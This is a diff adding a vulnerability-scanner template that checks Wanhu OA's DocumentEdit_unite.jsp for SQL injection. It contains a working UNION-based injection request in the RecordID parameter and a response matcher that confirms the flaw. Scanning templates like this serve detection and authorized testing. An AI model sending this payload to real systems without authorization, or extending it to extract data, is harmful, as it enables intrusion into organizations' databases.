@@ -1,0 +1,18 @@
+id: wanhu-oa-documentedit-unite-sqli
+
+info:
+  name: 万户OA DocumentEdit_unite.jsp SQL注入
+  author: SleepingBag945
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEdit_unite.jsp;?RecordID=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(select%20111*111),NULL,NULL,NULL,NULL,NULL,NULL-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body,'12321') && status_code == 200"
+
